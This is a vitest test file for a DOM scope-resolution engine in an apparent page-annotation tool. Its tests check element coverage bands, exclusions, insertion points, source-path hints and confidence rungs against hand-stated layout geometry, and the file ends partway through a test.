import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
// Read as text, not via fs: the mangling guard must hold wherever vitest is
// rooted from, and `?raw` resolves through the same alias map as the import.
import scopeSource from '../../src/core/scope.ts?raw';
import { SCOPE_GEN, climb, demoteScope, resolveScope } from '../../src/core/scope';
import type { ScopeRect } from '../../src/core/scope';
// Its own module, not scope.ts: export.ts and storage.ts both validate and
// neither may import the engine (export.ts is DOM-free by contract).
import { validateSourcePath } from '../../src/core/source-path';

// happy-dom lays nothing out, so every test states the geometry it means.
// `rect(el, ...)` is the only source of layout truth in this file.
function rect(el: Element, left: number, top: number, width: number, height: number): void {
  el.getBoundingClientRect = () =>
    ({
      left,
      top,
      width,
      height,
      right: left + width,
      bottom: top + height,
      x: left,
      y: top,
    }) as DOMRect;
}

function mount(html: string): HTMLElement {
  document.body.innerHTML = html;
  rect(document.body, 0, 0, 1000, 800);
  return document.body;
}

// R4's area half measures against the DOCUMENT, not the viewport. happy-dom
// reports 0 for scrollHeight, so every test that exercises that half states the
// document height it means, the same way `rect()` states element geometry.
function docHeight(px: number): void {
  Object.defineProperty(document.documentElement, 'scrollHeight', {
    value: px,
    configurable: true,
  });
}

// The canonical case the whole release exists for: three cards in a grid.
function grid(): { grid: HTMLElement; cards: HTMLElement[] } {
  mount(`
    <main>
      <section class="pricing">
        <div class="grid">
          <article class="card"><h3>Free</h3><p>0</p></article>
          <article class="card"><h3>Pro</h3><p>20</p></article>
          <article class="card"><h3>Team</h3><p>50</p></article>
        </div>
      </section>
    </main>`);
  const g = document.querySelector('.grid') as HTMLElement;
  const cards = Array.from(document.querySelectorAll('.card')) as HTMLElement[];
  rect(document.querySelector('main')!, 0, 0, 1000, 800);
  rect(document.querySelector('.pricing')!, 0, 100, 1000, 400);
  // 20px of container padding on every side — the case that made a
  // containment climb escalate to the row.
  rect(g, 20, 120, 960, 360);
  cards.forEach((c, i) => rect(c, 40 + i * 320, 140, 280, 320));
  cards.forEach((c) => {
    rect(c.querySelector('h3')!, 0, 0, 0, 0);
    rect(c.querySelector('p')!, 0, 0, 0, 0);
  });
  return { grid: g, cards };
}

// A marquee that comfortably covers all three cards and nothing else.
const OVER_ALL_THREE: ScopeRect = { left: 30, top: 130, width: 940, height: 340 };

beforeEach(() => {
  document.body.innerHTML = '';
});

describe('scope — the covered set (R5, R6)', () => {
  it('names the N cards, not their container', () => {
    const { cards } = grid();
    const result = resolveScope(cards[0]!, OVER_ALL_THREE)!;
    expect(result.elements.members).toEqual(cards);
    expect(result.scope.members).toHaveLength(3);
    expect(result.scope.members!.every((m) => m.band === 'inside')).toBe(true);
  });

  it('stops descending at the first inside node — 3 nodes, not 63', () => {
    const { cards } = grid();
    // Give the descendants real boxes so they would qualify if we recursed.
    cards.forEach((c, i) => {
      rect(c.querySelector('h3')!, 50 + i * 320, 150, 260, 40);
      rect(c.querySelector('p')!, 50 + i * 320, 200, 260, 40);
    });
    const result = resolveScope(cards[0]!, OVER_ALL_THREE)!;
    expect(result.scope.members).toHaveLength(3);
    expect(result.elements.members.map((e) => e.tagName)).toEqual([
      'ARTICLE',
      'ARTICLE',
      'ARTICLE',
    ]);
  });

  it('reports the containing boundary separately from the changed nodes', () => {
    const { grid: g, cards } = grid();
    const result = resolveScope(cards[0]!, OVER_ALL_THREE)!;
    expect(result.elements.boundary).toBe(g);
    expect(result.scope.boundary.tag).toBe('div');
  });

  it('emits the inner grids for a nested grid-in-grid, not the outer one', () => {
    mount(`
      <div id="outer">
        <div class="inner"><span class="a"></span></div>
        <div class="inner"><span class="b"></span></div>
      </div>`);
    const outer = document.querySelector('#outer') as HTMLElement;
    const inners = Array.from(document.querySelectorAll('.inner')) as HTMLElement[];
    rect(outer, 0, 0, 400, 200);
    rect(inners[0]!, 0, 0, 200, 200);
    rect(inners[1]!, 200, 0, 200, 200);
    inners.forEach((i) => rect(i.firstElementChild!, 0, 0, 10, 10));
    const result = resolveScope(outer, { left: 0, top: 0, width: 400, height: 200 })!;
    expect(result.elements.members).toEqual(inners);
  });

  it('recurses through a low-coverage wrapper to reach the covered child', () => {
    // The wrapper is huge and barely covered; the card inside it is fully
    // covered. A walk that stops descending at a grazed node loses the card
    // entirely AND lists the wrapper as an exclusion — an ancestor of the very
    // node the reviewer selected. The boundary is the OUTER element, so the
    // wrapper is genuinely scored on the way down.
    mount('<div id="outer"><div id="wrap"><div id="card"></div></div></div>');
    const outer = document.querySelector('#outer') as HTMLElement;
    const wrap = document.querySelector('#wrap') as HTMLElement;
    const card = document.querySelector('#card') as HTMLElement;
    rect(outer, 0, 0, 1000, 1000);
    rect(wrap, 0, 0, 1000, 1000);
    rect(card, 10, 10, 100, 100);
    const result = resolveScope(outer, { left: 5, top: 5, width: 110, height: 110 })!;
    expect(result.elements.members).toEqual([card]);
    expect(result.elements.excluded).not.toContain(wrap);
  });
});

describe('scope — bands and the coverage predicate', () => {
  it('uses coverage-of-target, not IoU: a small marquee inside a big element is not inside it', () => {
    mount('<div id="a"><div id="b"></div></div>');
    const a = document.querySelector('#a') as HTMLElement;
    const b = document.querySelector('#b') as HTMLElement;
    rect(a, 0, 0, 1000, 1000);
    rect(b, 0, 0, 20, 20);
    const result = resolveScope(a, { left: 0, top: 0, width: 20, height: 20 })!;
    // b is fully covered; a is not a member of its own change set.
    expect(result.elements.members).toEqual([b]);
  });

  it('bands a half-covered node as partial when nothing under it qualifies', () => {
    mount('<div id="row"><div id="cell"></div></div>');
    const row = document.querySelector('#row') as HTMLElement;
    const cell = document.querySelector('#cell') as HTMLElement;
    rect(row, 0, 0, 200, 100);
    rect(cell, 0, 0, 200, 100);
    const result = resolveScope(row, { left: 0, top: 0, width: 100, height: 100 })!;
    expect(result.scope.members).toHaveLength(1);
    expect(result.scope.members![0]!.band).toBe('partial');
  });

  it('clips a child against its container before scoring — an overflow-hidden carousel card is not inside', () => {
    // The card reports 500×200 while its clipping parent is 100×40: without
    // the clip it scores `inside` for a region the reviewer cannot see.
    mount('<div id="clip"><div id="card"></div></div>');
    const clip = document.querySelector('#clip') as HTMLElement;
    const card = document.querySelector('#card') as HTMLElement;
    rect(clip, 0, 0, 100, 40);
    rect(card, 0, 0, 500, 200);
    const result = resolveScope(clip, { left: 0, top: 0, width: 100, height: 40 })!;
    expect(result.scope.members?.[0]?.band).toBe('inside');
    // The clipped card, not the unclipped 500×200 claim, is what was scored.
    expect(result.elements.members).toEqual([card]);
  });

  it('a zero-area node joins no band and no exclusion set', () => {
    // 0/0 is NaN and NaN >= 0.35 is false, so an unguarded divisor would drop
    // a zero-area node into the EXCLUSION list — letting a hostile page author
    // a free "do not change" line.
    mount('<div id="host"><div id="ghost"></div><div id="real"></div></div>');
    const host = document.querySelector('#host') as HTMLElement;
    const ghost = document.querySelector('#ghost') as HTMLElement;
    const real = document.querySelector('#real') as HTMLElement;
    rect(host, 0, 0, 200, 200);
    rect(ghost, 0, 0, 0, 0);
    rect(real, 0, 0, 200, 200);
    const result = resolveScope(host, { left: 0, top: 0, width: 200, height: 200 })!;
    expect(result.elements.members).not.toContain(ghost);
    expect(result.elements.excluded).not.toContain(ghost);
  });
});

describe('scope — exclusions (R7)', () => {
  it('emits grazed neighbours as explicit exclusions', () => {
    mount('<div id="row"><div id="hit"></div><div id="graze"></div></div>');
    const row = document.querySelector('#row') as HTMLElement;
    const hit = document.querySelector('#hit') as HTMLElement;
    const graze = document.querySelector('#graze') as HTMLElement;
    rect(row, 0, 0, 400, 100);
    rect(hit, 0, 0, 200, 100);
    rect(graze, 200, 0, 200, 100);
    const result = resolveScope(row, { left: 0, top: 0, width: 210, height: 100 })!;
    expect(result.elements.members).toEqual([hit]);
    expect(result.elements.excluded).toEqual([graze]);
  });

  it('no ancestor of an inside node ever appears in the exclusion set', () => {
    // Built to make the invariant BITE: #wrap is barely covered (it would band
    // as grazed on its own numbers) but holds a fully covered card, while
    // #other is genuinely grazed and has nothing under it. A walk that bands
    // before recursing excludes #wrap — an ancestor of the reviewer's own
    // selection, telling the agent not to touch the thing they selected.
    // Asserting this on the plain grid was vacuous: that case has no
    // exclusions at all, so the loop body never ran.
    mount(`
      <div id="boundary">
        <div id="wrap"><div id="card"></div></div>
        <div id="other"></div>
      </div>`);
    const boundary = document.querySelector('#boundary') as HTMLElement;
    rect(boundary, 0, 0, 1000, 400);
    rect(document.querySelector('#wrap')!, 0, 0, 900, 400);
    rect(document.querySelector('#card')!, 0, 0, 100, 100);
    rect(document.querySelector('#other')!, 900, 0, 100, 400);
    const result = resolveScope(boundary, { left: 0, top: 0, width: 910, height: 100 })!;

    expect(result.elements.members.map((e) => (e as HTMLElement).id)).toEqual(['card']);
    expect(result.elements.excluded.length).toBeGreaterThan(0);
    for (const excluded of result.elements.excluded) {
      for (const member of result.elements.members) {
        expect(excluded.contains(member)).toBe(false);
      }
    }
  });

  it('caps the exclusion set — a busy marquee grazes dozens', () => {
    // One genuinely covered cell so this stays a REGION, plus 40 cells the
    // marquee only clips. R7 has no natural bound; without a cap the artifact
    // grows a "do not change" list longer than the change itself.
    const cells = Array.from({ length: 40 }, (_, i) => `<i id="c${i}"></i>`).join('');
    mount(`<div id="row"><b id="hit"></b>${cells}</div>`);
    const row = document.querySelector('#row') as HTMLElement;
    rect(row, 0, 0, 4100, 100);
    rect(document.querySelector('#hit')!, 0, 0, 100, 20);
    for (let i = 0; i < 40; i++)
      rect(document.querySelector(`#c${i}`)!, 100 + i * 100, 0, 100, 100);
    // Covers #hit outright and clips the leading 20px of every other cell.
    const result = resolveScope(row, { left: 0, top: 0, width: 4100, height: 20 })!;
    expect(result.scope.members).toHaveLength(1);
    expect(result.scope.excluded!.length).toBeLessThanOrEqual(12);
  });

  it('an insertion still reports what it grazed', () => {
    // Exclusions are not a property of the region branch — a note dropped in a
    // gap has neighbours the agent must equally leave alone.
    mount('<div id="stack"><p id="a"></p><p id="b"></p></div>');
    const stack = document.querySelector('#stack') as HTMLElement;
    rect(stack, 0, 0, 400, 400);
    rect(document.querySelector('#a')!, 0, 0, 400, 160);
    rect(document.querySelector('#b')!, 0, 300, 400, 100);
    // Clips 10px of #a and stops short of #b.
    const s = resolveScope(stack, { left: 0, top: 150, width: 400, height: 100 })!.scope;
    expect(s.between).toBeDefined();
    expect(s.excluded?.map((n) => n.tag)).toEqual(['p']);
  });

  // R9. Coverage is scored against each ELEMENT's own area, so a marquee that
  // is small relative to everything it crosses clears no floor and leaves
  // `members` empty — which the insertion branch then read as "the reviewer
  // drew a gap". A real 0.9.1 export did exactly this to a hero note: the
  // `<h1>` the note was about was published under **Do not change**, the change
  // list was absent entirely, and an insertion point was asserted inside a
  // container holding three elements. Silence would have been better.
  //
  // The discriminator is not "did it graze anything" — the test above grazes a
  // paragraph and IS a genuine insertion. It is how much of the DRAWN REGION
  // the grazed set fills: content the reviewer drew across, or empty space.
  it('a marquee drawn across oversized content is a change set, not a gap', () => {
    mount('<div id="stack"><h1 id="title"><span id="accent"></span></h1></div>');
    const stack = document.querySelector('#stack') as HTMLElement;
    rect(stack, 0, 0, 400, 400);
    // Both dwarf the marquee, so neither can clear the 0.35 floor.
    rect(document.querySelector('#title')!, 0, 0, 400, 300);
    rect(document.querySelector('#accent')!, 0, 0, 400, 280);
    const s = resolveScope(stack, { left: 0, top: 100, width: 400, height: 60 })!.scope;

    expect(s.between).toBeUndefined();
    expect(s.members?.map((n) => n.tag)).toContain('h1');
    expect(s.excluded).toBeUndefined();
  });

  // The climb is upward-only, so a layout wrapper OUTSIDE the annotated
  // component puts the attribute below the boundary where it can never be
  // reached. That is not exotic markup — `<div class="wrap"><Hero/></div>` is
  // the shape the audited site uses for its hero, and it was the one note in a
  // seven-note export that came back with no source hint while every other
  // section resolved one.
  it('finds a source hint on the single annotated component below the boundary', () => {
    mount(
      '<div id="stack"><section id="hero" data-pinflow-source="src/components/Hero.astro"><h1 id="title"></h1></section></div>',
    );
    const stack = document.querySelector('#stack') as HTMLElement;
    rect(stack, 0, 0, 400, 400);
    rect(document.querySelector('#hero')!, 0, 0, 400, 400);
    rect(document.querySelector('#title')!, 0, 0, 400, 300);
    const s = resolveScope(stack, { left: 0, top: 100, width: 400, height: 60 })!.scope;
    expect(s.source).toBe('src/components/Hero.astro');
  });

  // Two candidates means the hint would be a coin flip, and a hint naming the
  // WRONG file is worse than none — an agent is told to confirm it, not to
  // distrust it. Silence is the designed failure mode.
  it('stays silent when the boundary holds more than one annotated component', () => {
    mount(
      '<div id="stack"><section id="a" data-pinflow-source="src/A.astro"></section><section id="b" data-pinflow-source="src/B.astro"></section><h1 id="title"></h1></div>',
    );
    const stack = document.querySelector('#stack') as HTMLElement;
    rect(stack, 0, 0, 400, 400);
    rect(document.querySelector('#a')!, 0, 0, 400, 10);
    rect(document.querySelector('#b')!, 0, 10, 400, 10);
    rect(document.querySelector('#title')!, 0, 0, 400, 300);
    const s = resolveScope(stack, { left: 0, top: 100, width: 400, height: 60 })!.scope;
    expect(s.source).toBeUndefined();
  });

  // An ancestor is direct evidence; a descendant is an inference. When both
  // exist the climb must still win, or a nested annotated child could rename
  // the note's component out from under its own boundary.
  it('prefers an ancestor hint over a descendant one', () => {
    mount(
      '<div id="stack" data-pinflow-source="src/Outer.astro"><section id="hero" data-pinflow-source="src/Inner.astro"><h1 id="title"></h1></section></div>',
    );
    const stack = document.querySelector('#stack') as HTMLElement;
    rect(stack, 0, 0, 400, 400);
    rect(document.querySelector('#hero')!, 0, 0, 400, 400);
    rect(document.querySelector('#title')!, 0, 0, 400, 300);
    const s = resolveScope(stack, { left: 0, top: 100, width: 400, height: 60 })!.scope;
    expect(s.source).toBe('src/Outer.astro');
  });

  it('never lets a descendant hint promote the rung to source', () => {
    mount(
      '<div id="stack"><section id="hero" data-pinflow-source="src/components/Hero.astro"><h1 id="title"></h1></section></div>',
    );
    const stack = document.querySelector('#stack') as HTMLElement;
    rect(stack, 0, 0, 400, 400);
    rect(document.querySelector('#hero')!, 0, 0, 400, 400);
    rect(document.querySelector('#title')!, 0, 0, 400, 300);
    const s = resolveScope(stack, { left: 0, top: 100, width: 400, height: 60 })!.scope;
    expect(s.source).toBeDefined();
    expect(s.rung).not.toBe('source');
  });

  // The whole defect, reassembled from the real record rather than invented:
  // comment 1 of the 2026-08-29 export, whose note was "Copy needs work". The
  // artifact published an absent change list, the `<h1>` the note was about
  // under **Do not change**, an insertion point inside a container holding
  // three elements, and no source hint — while every other section in the same
  // export resolved one. Both fixes have to fire on this one shape.
  //
  // Geometry is the export's own: boundary `#main > div.wrap`, region 41% x 22%
  // of it from 3%, 26%, with `section.hero` carrying the attribute BELOW the
  // boundary because the page wraps the hero rather than the hero wrapping.
  it('the hero note that produced none of what it needed', () => {
    mount(
      '<div id="wrap"><section id="hero" data-pinflow-source="src/components/Hero.astro">' +
        '<h1 id="hero-title"><span id="accent"></span></h1></section></div>',
    );
    const wrap = document.querySelector('#wrap') as HTMLElement;
    rect(wrap, 0, 0, 1000, 1000);
    rect(document.querySelector('#hero')!, 0, 0, 1000, 900);
    rect(document.querySelector('#hero-title')!, 50, 200, 900, 400);
    rect(document.querySelector('#accent')!, 50, 400, 900, 150);
    const s = resolveScope(wrap, { left: 30, top: 260, width: 410, height: 220 })!.scope;

    // Was: no change list at all.
    expect(s.members?.map((n) => n.tag)).toContain('h1');
    // Was: the h1 the note was about, filed as untouchable.
    expect(s.excluded).toBeUndefined();
    // Was: "nothing exists there yet", asserted over three elements.
    expect(s.between).toBeUndefined();
    // Was: absent, because the climb only ever went up.
    expect(s.source).toBe('src/components/Hero.astro');
  });

  it('every promoted member is banded partial — none of them cleared the floor', () => {
    mount('<div id="stack"><h1 id="title"></h1></div>');
    const stack = document.querySelector('#stack') as HTMLElement;
    rect(stack, 0, 0, 400, 400);
    rect(document.querySelector('#title')!, 0, 0, 400, 300);
    const s = resolveScope(stack, { left: 0, top: 100, width: 400, height: 60 })!.scope;
    expect(s.members!.every((m) => m.band === 'partial')).toBe(true);
  });

  // The boundary claim survives (a source rung still found what it found), but
  // no member reached the ambiguity floor, so the set is best-effort and must
  // not be published at the confidence of a clean containment.
  it('demotes confidence when nothing cleared the floor', () => {
    mount('<div id="stack" data-pinflow-source="src/Hero.tsx"><h1 id="title"></h1></div>');
    const stack = document.querySelector('#stack') as HTMLElement;
    rect(stack, 0, 0, 400, 400);
    rect(document.querySelector('#title')!, 0, 0, 400, 300);
    const s = resolveScope(stack, { left: 0, top: 100, width: 400, height: 60 })!.scope;
    expect(s.rung).toBe('source');
    expect(s.confidence).not.toBe('high');
  });
});

describe('scope — insertions (R8)', () => {
  it('a marquee in a hollow container records an insertion, not a failure', () => {
    mount('<div id="stack"><p id="a"></p><p id="b"></p></div>');
    const stack = document.querySelector('#stack') as HTMLElement;
    rect(stack, 0, 0, 400, 400);
    rect(document.querySelector('#a')!, 0, 0, 400, 100);
    rect(document.querySelector('#b')!, 0, 300, 400, 100);
    // Drawn entirely in the gap between the two paragraphs.
    const result = resolveScope(stack, { left: 0, top: 150, width: 400, height: 100 })!;
    expect(result.scope.members).toBeUndefined();
    expect(result.scope.between).toBeDefined();
    expect(result.scope.between!.before?.tag).toBe('p');
    expect(result.scope.between!.after?.tag).toBe('p');
  });

  it('records the leading edge when the gap is above the first child', () => {
    mount('<div id="stack"><p id="a"></p></div>');
    const stack = document.querySelector('#stack') as HTMLElement;
    rect(stack, 0, 0, 400, 400);
    rect(document.querySelector('#a')!, 0, 300, 400, 100);
    const result = resolveScope(stack, { left: 0, top: 0, width: 400, height: 100 })!;
    expect(result.scope.between!.before).toBeUndefined();
    expect(result.scope.between!.after?.tag).toBe('p');
  });

  it('a plain pin is never reinterpreted as an insertion', () => {
    mount('<div id="stack"><p id="a"></p></div>');
    const a = document.querySelector('#a') as HTMLElement;
    rect(document.querySelector('#stack')!, 0, 0, 400, 400);
    rect(a, 0, 0, 400, 100);
    const result = resolveScope(a)!;
    expect(result.scope.between).toBeUndefined();
  });

  it('structure is total: never both an insertion and a region', () => {
    mount('<div id="stack"><p id="a"></p><p id="b"></p></div>');
    const stack = document.querySelector('#stack') as HTMLElement;
    rect(stack, 0, 0, 400, 400);
    rect(document.querySelector('#a')!, 0, 0, 400, 100);
    rect(document.querySelector('#b')!, 0, 300, 400, 100);
    for (const r of [
      { left: 0, top: 150, width: 400, height: 100 },
      { left: 0, top: 0, width: 400, height: 400 },
    ]) {
      const s = resolveScope(stack, r)!.scope;
      expect(Boolean(s.between) && Boolean(s.members)).toBe(false);
    }
  });

  it('never writes an empty collection — a backend normalising [] cannot change the kind', () => {
    const { cards } = grid();
    const s = resolveScope(cards[0]!, OVER_ALL_THREE)!.scope;
    const json = JSON.parse(JSON.stringify(s)) as Record<string, unknown>;
    for (const key of ['members', 'excluded']) {
      if (key in json) expect((json[key] as unknown[]).length).toBeGreaterThan(0);
    }
  });
});

describe('scope — the ladder (R2, R3)', () => {
  it('rung (a): a validated data-pinflow-source wins outright', () => {
    mount('<div data-pinflow-source="src/Pricing.tsx"><button id="b">Go</button></div>');
    const { rung } = climb(document.querySelector('#b') as Element);
    expect(rung).toBe('source');
  });

  // The source hint is a HINT, not a boundary. A marquee picks its boundary by
  // containment, which is almost never a component root, so reading the
  // attribute off the boundary alone delivered a hint on virtually nothing —
  // on the audited page, on one note out of five even after instrumenting it.
  it('finds the source hint on an ancestor of a marquee boundary', () => {
    mount(`
      <div data-pinflow-source="src/components/Artifact.astro">
        <div id="wrap"><p id="a">one</p><p id="b">two</p></div>
      </div>`);
    rect(document.querySelector('[data-pinflow-source]')!, 0, 0, 900, 500);
    rect(document.querySelector('#wrap')!, 0, 0, 900, 400);
    rect(document.querySelector('#a')!, 10, 10, 880, 180);
    rect(document.querySelector('#b')!, 10, 200, 880, 180);
    const result = resolveScope(document.querySelector('#a') as Element, {
      left: 5,
      top: 5,
      width: 890,
      height: 390,
    })!;
    // The boundary is the plain wrapper; the hint comes from above it.
    expect((result.elements.boundary as HTMLElement).id).toBe('wrap');
    expect(result.scope.source).toBe('src/components/Artifact.astro');
  });

  it('rung (b): the nearest data-testid ancestor', () => {
    mount(
      '<section data-testid="pricing"><button id="b"><span id="s">Go</span></button></section>',
    );
    const { el, rung } = climb(document.querySelector('#s') as Element);
    expect(rung).toBe('testid');
    expect((el as HTMLElement).dataset['testid']).toBe('pricing');
  });

  it('rung (c): a repeated sibling resolves to the instance, with the list as its parent', () => {
    // Tailwind-shaped classes on purpose: the structural signature must carry
    // this, because a word-like class filter sees nothing here.
    mount(`
      <ul id="list">
        <li class="flex gap-4 md:w-1/2"><img><span>a</span></li>
        <li class="flex gap-4 md:w-1/2"><img><span>b</span></li>
        <li class="flex gap-4 md:w-1/2"><img><span>c</span></li>
      </ul>`);
    const span = document.querySelector('li span') as Element;
    const { el, rung } = climb(span);
    expect(rung).toBe('repeated');
    expect(el.tagName).toBe('LI');
  });

  it('rung (c) does not fire on one-off siblings that merely share utility classes', () => {
    mount(`
      <div id="wrap">
        <header class="flex gap-4"><h1>Title</h1></header>
        <main class="flex gap-4"><p>Body</p></main>
      </div>`);
    const { rung } = climb(document.querySelector('h1') as Element);
    expect(rung).not.toBe('repeated');
  });

  it('rung (d): a landmark container', () => {
    mount('<nav id="n"><a id="a">Home</a></nav>');
    const { el, rung } = climb(document.querySelector('#a') as Element);
    expect(rung).toBe('landmark');
    expect(el.tagName).toBe('NAV');
  });

  it('rung (e): nothing matches — the anchor element itself, low confidence', () => {
    mount('<div><span id="s">x</span></div>');
    const s = document.querySelector('#s') as Element;
    const { el, rung } = climb(s);
    expect(rung).toBe('anchor');
    expect(el).toBe(s);
    rect(s, 0, 0, 10, 10);
    expect(resolveScope(s)!.scope.confidence).toBe('low');
  });

  it('every scope carries its rung and confidence', () => {
    const { cards } = grid();
    const s = resolveScope(cards[0]!, OVER_ALL_THREE)!.scope;
    expect(s.rung).toBeTruthy();
    expect(['high', 'medium', 'low']).toContain(s.confidence);
  });

  it('stamps the tuning generation — thresholds are unresolved research', () => {
    const { cards } = grid();
    expect(resolveScope(cards[0]!, OVER_ALL_THREE)!.scope.gen).toBe(SCOPE_GEN);
  });
});

describe('scope — the never-<body> predicate (R4)', () => {
  it('does not resolve to body', () => {
    mount('<span id="s">x</span>');
    const s = document.querySelector('#s') as Element;
    rect(s, 0, 0, 10, 10);
    const result = resolveScope(s)!;
    expect(result.elements.boundary).not.toBe(document.body);
    expect(result.scope.boundary.tag).not.toBe('body');
  });

  // The two halves of the predicate get one test each, and each test must
  // DISARM the other half — otherwise it passes on the wrong mechanism. An
  // earlier version of the descendants test did exactly that: neutering
  // MAX_DESCENDANT_SHARE left the whole suite green, because the wrapper was
  // being rejected on viewport area the whole time.
  it('rejects a wrapper by share-of-descendants alone, not by element name', () => {
    // <div id="root"> holds the whole app: an element-name blocklist lets it
    // through. Its BOX is deliberately tiny, so the viewport predicate cannot
    // fire and only the descendant share can reject it.
    const many = Array.from({ length: 60 }, (_, i) => `<p id="p${i}">x</p>`).join('');
    mount(`<div id="root" data-testid="root">${many}<span id="s">x</span></div>`);
    const s = document.querySelector('#s') as Element;
    rect(s, 0, 0, 10, 10);
    rect(document.querySelector('#root')!, 0, 0, 40, 40);
    Object.defineProperty(window, 'innerWidth', { value: 1200, configurable: true });
    Object.defineProperty(window, 'innerHeight', { value: 900, configurable: true });
    const result = resolveScope(s)!;
    expect((result.elements.boundary as HTMLElement).id).not.toBe('root');
    expect(result.scope.confidence).toBe('low');
  });

  // Re-derived in 0.9.0. This was "a landmark covering the whole viewport is
  // demoted by area alone", and it encoded the wrong rule: an element's box is
  // its FULL SCROLL height, so "bigger than one screen" is true of almost every
  // section on a content page — a section holding 18.7% of the document
  // measured 1.97 viewports. The intent was "this candidate is really the
  // page", and the page is the DOCUMENT, not the screen. Same predicate, right
  // denominator.
  it('a landmark covering the whole document is demoted by area alone', () => {
    // Two elements in the document, so descendant share cannot be what fires.
    mount('<main id="m"><span id="s">x</span></main>');
    const m = document.querySelector('#m') as HTMLElement;
    const s = document.querySelector('#s') as Element;
    rect(m, 0, 0, 1000, 8000);
    rect(s, 0, 0, 10, 10);
    docHeight(8000);
    Object.defineProperty(window, 'innerWidth', { value: 1000, configurable: true });
    Object.defineProperty(window, 'innerHeight', { value: 800, configurable: true });
    expect(resolveScope(s)!.scope.confidence).toBe('low');
  });

  // The regression the old rule caused: note 4 of the audited export. A point
  // pin inside a tall section resolved its boundary correctly at rung
  // `repeated`, then R4 fired SOLELY because the section was 1.97 viewports
  // tall — collapsing the boundary onto the pinned element and emitting no
  // Change block at all.
  it('a section taller than the screen but small in the document keeps its rung', () => {
    const filler = Array.from({ length: 20 }, (_, i) => `<p id="f${i}">x</p>`).join('');
    mount(
      `<main id="m"><section id="sec"><pre id="p">code</pre></section><div>${filler}</div></main>`,
    );
    const sec = document.querySelector('#sec') as HTMLElement;
    const p = document.querySelector('#p') as Element;
    rect(document.querySelector('#m')!, 0, 0, 1000, 9000);
    // Two viewports tall, but a small share of a 9000px document.
    rect(sec, 0, 0, 1000, 1600);
    rect(p, 10, 10, 200, 100);
    docHeight(9000);
    Object.defineProperty(window, 'innerWidth', { value: 1000, configurable: true });
    Object.defineProperty(window, 'innerHeight', { value: 800, configurable: true });
    const result = resolveScope(p)!;
    expect((result.elements.boundary as HTMLElement).id).toBe('sec');
    expect(result.scope.confidence).toBe('medium');
    // boundary !== target, so the pinned element is seeded as the change.
    expect(result.scope.members).toHaveLength(1);
    expect(result.scope.members![0]!.tag).toBe('pre');
  });

  // R4 says EVERY rung is size-checked. The marquee branch assigns a rung via
  // rungOf() and then published CONFIDENCE[rung] unchecked, so a region that
  // resolved to the page shipped at `medium` while a tightly-scoped point pin
  // shipped at `low` — the field was anti-correlated with usefulness.
  it('a marquee boundary holding most of the document is demoted', () => {
    mount(`
      <main id="m">
        <section id="a"><p>one</p><p>two</p></section>
        <section id="b"><p>three</p><p>four</p></section>
      </main>`);
    const m = document.querySelector('#m') as HTMLElement;
    rect(m, 0, 0, 1000, 600);
    rect(document.querySelector('#a')!, 0, 0, 1000, 300);
    rect(document.querySelector('#b')!, 0, 300, 1000, 300);
    document.querySelectorAll('p').forEach((p, i) => rect(p, 0, i * 100, 1000, 90));
    // Disarm the area half: the boundary is well under one viewport, so only
    // share-of-descendants can fire.
    Object.defineProperty(window, 'innerWidth', { value: 1600, configurable: true });
    Object.defineProperty(window, 'innerHeight', { value: 1200, configurable: true });
    const target = document.querySelector('#a p') as Element;
    // Spans both sections, so the smallest containing ancestor is <main>.
    const result = resolveScope(target, { left: 10, top: 250, width: 980, height: 100 })!;
    expect((result.elements.boundary as HTMLElement).id).toBe('m');
    expect(result.scope.confidence).toBe('low');
  });

  // The guard on the fix above. Reusing tooWide() wholesale here would demote
  // on VIEWPORT SHARE, which compares an element's full scroll box against one
  // screen — on a content page that is a "taller than the screen" test, not a
  // page-ness test, and it would flatten every marquee on the page to `low`.
  it('a marquee boundary taller than the viewport keeps its rung confidence', () => {
    const filler = Array.from({ length: 12 }, () => '<p>x</p>').join('');
    mount(
      `<main id="m"><section id="tall"><p id="t">one</p></section><div id="f">${filler}</div></main>`,
    );
    const tall = document.querySelector('#tall') as HTMLElement;
    const t = document.querySelector('#t') as Element;
    rect(document.querySelector('#m')!, 0, 0, 1000, 7000);
    rect(tall, 0, 0, 1000, 5000);
    // Deliberately too small to contain the region: containerFor starts at the
    // target, so a roomy target would BE the boundary and prove nothing.
    rect(t, 10, 10, 100, 40);
    Object.defineProperty(window, 'innerWidth', { value: 1000, configurable: true });
    Object.defineProperty(window, 'innerHeight', { value: 800, configurable: true });
    // State the precondition rather than trusting it: the boundary really does
    // exceed one viewport, so this test is only green because the area
    // predicate is NOT consulted on this branch.
    const viewportShare = (1000 * 5000) / (window.innerWidth * window.innerHeight);
    expect(viewportShare).toBeGreaterThan(1);
    const result = resolveScope(t, { left: 20, top: 20, width: 400, height: 400 })!;
    expect((result.elements.boundary as HTMLElement).id).toBe('tall');
    expect(result.scope.rung).toBe('landmark');
    expect(result.scope.confidence).toBe('medium');
  });
});

// A rect that slices one column of a grid partitions a semantically single
// list: some cells become members, the grazed column becomes exclusions, and an
// untouched column is recorded nowhere at all. The geometry is right and the
// artifact still reads as a precise permission list over a set the reviewer
// meant as a whole. One number restores the missing context.
describe('scope — members that are a slice of a repeated set', () => {
  function fiveInAList(): HTMLElement[] {
    mount(`
      <div id="wrap">
        <ul id="callouts">
          <li>one</li><li>two</li><li>three</li><li>four</li><li>five</li>
        </ul>
      </div>`);
    rect(document.querySelector('#wrap')!, 0, 0, 900, 400);
    rect(document.querySelector('#callouts')!, 0, 0, 900, 400);
    const items = Array.from(document.querySelectorAll('li')) as HTMLElement[];
    // Three columns, two rows — column 1 is {1,4}, column 2 is {2,5}, column 3
    // is {3}. Exactly the layout that produced the audited 2-of-5 split.
    const col = [0, 1, 2, 0, 1];
    const row = [0, 0, 0, 1, 1];
    items.forEach((li, i) => rect(li, 20 + col[i]! * 300, 20 + row[i]! * 180, 280, 160));
    return items;
  }

  it('reports how many same-tag siblings the members are a slice of', () => {
    const items = fiveInAList();
    // Column 1 only: covers li 1 and li 4, grazes nothing else.
    const result = resolveScope(items[0]!, { left: 15, top: 15, width: 290, height: 350 })!;
    expect(result.scope.members).toHaveLength(2);
    expect(result.scope.siblings).toBe(5);
  });

  it('says nothing when the members ARE the whole set', () => {
    const items = fiveInAList();
    const result = resolveScope(items[0]!, { left: 10, top: 10, width: 880, height: 380 })!;
    expect(result.scope.members).toHaveLength(5);
    expect(result.scope.siblings).toBeUndefined();
  });

  it('says nothing when the members do not share one parent and tag', () => {
    const { cards } = grid();
    const result = resolveScope(cards[0]!, OVER_ALL_THREE)!;
    // All three cards ARE the whole set, so there is no slice to report.
